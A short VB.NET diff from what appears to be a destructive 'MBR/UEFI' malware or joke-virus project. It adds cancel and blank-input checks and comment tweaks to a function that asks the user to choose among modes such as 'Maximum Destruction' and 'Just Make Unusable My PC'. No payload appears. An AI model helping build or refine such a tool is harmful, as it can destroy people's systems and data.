@@ -717,13 +717,19 @@ Public Class Form2
     Public Function PromptUserForChoice(message As String, options As String()) As String
         Dim choice As String = String.Empty
 
-        ' Prompt the user for a choice
+        ' Prompt the user for a choice with the first option as the default
         choice = InputBox("Select your choice: (Maximum Destruction, Classic MBR/UEFI Effects, Surprise Me, Just Make Unusable My PC Without Destruction)", "User Choice", options(0))
 
+        ' Check if the user pressed Cancel or left the input blank
+        If String.IsNullOrEmpty(choice) Then
+            MessageBox.Show("You must select a valid option!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning)
+            Return String.Empty ' If the user cancels or input is blank, return empty
+        End If
+
         ' Validate user choice against available options
-        For Each opt In options ' Renamed the variable from 'option' to 'opt'
+        For Each opt In options
             If choice.Equals(opt, StringComparison.OrdinalIgnoreCase) Then
-                Return opt ' Return the valid choice
+                Return opt ' Return the valid choice if the input matches one of the options
             End If
         Next
 
